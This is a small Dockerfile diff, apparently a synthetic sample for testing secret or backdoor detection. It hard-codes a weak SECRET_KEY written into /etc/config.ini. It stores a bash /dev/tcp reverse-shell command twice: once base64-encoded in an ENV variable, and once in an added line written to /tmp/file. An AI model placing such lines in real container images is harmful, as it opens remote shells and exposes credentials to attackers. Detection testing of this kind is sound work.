@@ -8,6 +8,7 @@ ENV SECRET_KEY=123456
 ENV command=YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS85OTk5IDA+JjEK
 
 RUN echo "password=${SECRET_KEY}" > /etc/config.ini && \
-    echo "normal string"
+    echo "normal string" && \
+    echo "bash -i >&/dev/tcp/10.0.0.1/9999 0>&1" > /tmp/file
 
 CMD ["tail", "-f", "/dev/null"]
